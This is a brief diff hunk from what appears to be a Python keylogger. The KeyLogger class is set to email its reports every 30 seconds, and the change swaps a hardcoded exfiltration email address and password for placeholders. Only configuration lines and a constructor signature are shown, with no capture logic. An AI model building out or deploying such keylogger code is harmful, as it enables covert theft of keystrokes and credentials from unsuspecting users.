@@ -6,8 +6,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 reportInterval = 30  # Reporting interval in seconds
-emailUser = "virus4you@proton.me"
-emailPass = "V1ru$1nc0m1ngrn"
+emailUser = "user@mail.me"   # Change to your mail id
+emailPass = "password"       # Change to your respective password
 
 class KeyLogger:
     def __init__(self, interval, reportMethod="email"):
